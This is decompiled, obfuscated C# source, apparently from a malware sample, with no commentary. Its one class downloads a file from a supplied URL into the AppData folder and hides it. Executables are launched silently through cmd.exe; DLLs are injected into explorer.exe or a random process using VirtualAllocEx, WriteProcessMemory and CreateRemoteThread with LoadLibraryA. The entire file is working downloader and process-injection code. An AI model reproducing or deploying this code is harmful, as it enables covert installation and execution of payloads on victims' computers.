using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

// Token: 0x0200003E RID: 62
internal class Class25
{
	// Token: 0x060001F5 RID: 501 RVA: 0x0000FDB0 File Offset: 0x0000DFB0
	public static void smethod_0(string string_0, string string_1)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (string_0 != "")
		{
			if (string_1.EndsWith(".exe"))
			{
				try
				{
					if (File.Exists(folderPath + "\\" + string_1))
					{
						try
						{
							File.Delete(folderPath + "\\" + string_1);
						}
						catch
						{
						}
					}
					using (WebClient webClient = new WebClient())
					{
						webClient.DownloadFile(string_0, folderPath + "\\" + string_1);
					}
					File.SetAttributes(folderPath + "\\" + string_1, FileAttributes.Hidden);
					string str = folderPath + "\\" + string_1;
					ProcessStartInfo startInfo = new ProcessStartInfo
					{
						UseShellExecute = true,
						WorkingDirectory = "C:\\Windows\\System32",
						FileName = "C:\\Windows\\System32\\cmd.exe",
						Arguments = "/c " + str,
						WindowStyle = ProcessWindowStyle.Hidden
					};
					Process.Start(startInfo);
					return;
				}
				catch
				{
					return;
				}
			}
			if (string_1.EndsWith(".dll"))
			{
				if (File.Exists(folderPath + "\\" + string_1))
				{
					try
					{
						File.Delete(folderPath + "\\" + string_1);
					}
					catch
					{
					}
				}
				try
				{
					using (WebClient webClient2 = new WebClient())
					{
						webClient2.DownloadFile(string_0, folderPath + "\\" + string_1);
					}
					File.SetAttributes(folderPath + "\\" + string_1, FileAttributes.Hidden);
					Class25.smethod_2(folderPath + "\\" + string_1);
				}
				catch
				{
				}
			}
		}
	}

	// Token: 0x060001F6 RID: 502 RVA: 0x0000FF78 File Offset: 0x0000E178
	public static int smethod_1(string string_0, Process process_0)
	{
		IntPtr intptr_ = Class25.OpenProcess(1082, false, process_0.Id);
		IntPtr procAddress = Class25.GetProcAddress(Class25.GetModuleHandle("kernel32.dll"), "LoadLibraryA");
		IntPtr intPtr = Class25.VirtualAllocEx(intptr_, IntPtr.Zero, (uint)((string_0.Length + 1) * Marshal.SizeOf(typeof(char))), 12288U, 4U);
		UIntPtr uintPtr;
		Class25.WriteProcessMemory(intptr_, intPtr, Encoding.Default.GetBytes(string_0), (uint)((string_0.Length + 1) * Marshal.SizeOf(typeof(char))), out uintPtr);
		Class25.CreateRemoteThread(intptr_, IntPtr.Zero, 0U, procAddress, intPtr, 0U, IntPtr.Zero);
		return 0;
	}

	// Token: 0x060001F7 RID: 503 RVA: 0x00010020 File Offset: 0x0000E220
	public static void smethod_2(string string_0)
	{
		try
		{
			Process process_;
			if (Process.GetProcessesByName("explorer").Length != 0)
			{
				process_ = Process.GetProcessesByName("explorer")[0];
			}
			else
			{
				Process[] processes = Process.GetProcesses();
				int maxValue = processes.Length;
				Random random = new Random();
				int num = random.Next(1, maxValue);
				process_ = Process.GetProcesses()[num];
			}
			Class25.smethod_1(string_0, process_);
			Class25.bool_0 = true;
		}
		catch
		{
		}
	}

	// Token: 0x060001F8 RID: 504 RVA: 0x00010094 File Offset: 0x0000E294
	public static bool smethod_3()
	{
		return Class25.bool_0;
	}

	// Token: 0x060001F9 RID: 505
	[DllImport("kernel32.dll")]
	public static extern IntPtr OpenProcess(int int_0, bool bool_3, int int_1);

	// Token: 0x060001FA RID: 506
	[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
	public static extern IntPtr GetModuleHandle(string string_0);

	// Token: 0x060001FB RID: 507
	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetProcAddress(IntPtr intptr_0, string string_0);

	// Token: 0x060001FC RID: 508
	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr VirtualAllocEx(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, uint uint_1, uint uint_2);

	// Token: 0x060001FD RID: 509
	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool WriteProcessMemory(IntPtr intptr_0, IntPtr intptr_1, byte[] byte_0, uint uint_0, out UIntPtr uintptr_0);

	// Token: 0x060001FE RID: 510
	[DllImport("kernel32.dll")]
	private static extern IntPtr CreateRemoteThread(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, IntPtr intptr_2, IntPtr intptr_3, uint uint_1, IntPtr intptr_4);

	// Token: 0x060001FF RID: 511
	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool IsWow64Process([In] IntPtr intptr_0, out bool bool_3);

	// Token: 0x06000200 RID: 512 RVA: 0x000100B0 File Offset: 0x0000E2B0
	public static bool smethod_4()
	{
		if ((Environment.OSVersion.Version.Major == 5 && Environment.OSVersion.Version.Minor >= 1) || Environment.OSVersion.Version.Major >= 6)
		{
			using (Process currentProcess = Process.GetCurrentProcess())
			{
				bool result;
				if (!Class25.IsWow64Process(currentProcess.Handle, out result))
				{
					return false;
				}
				return result;
			}
		}
		return false;
	}

	// Token: 0x06000201 RID: 513 RVA: 0x0000276F File Offset: 0x0000096F
	public Class25()
	{
		Class34.A1SfXVPz7w9eh();
		base..ctor();
	}

	// Token: 0x06000202 RID: 514 RVA: 0x00002DDE File Offset: 0x00000FDE
	// Note: this type is marked as 'beforefieldinit'.
	static Class25()
	{
		Class34.A1SfXVPz7w9eh();
		Class25.bool_0 = false;
		Class25.bool_1 = (IntPtr.Size == 8);
		Class25.bool_2 = (Class25.bool_1 || Class25.smethod_4());
	}

	// Token: 0x040000D5 RID: 213
	public static bool bool_0;

	// Token: 0x040000D6 RID: 214
	private static readonly bool bool_1;

	// Token: 0x040000D7 RID: 215
	private static readonly bool bool_2;
}
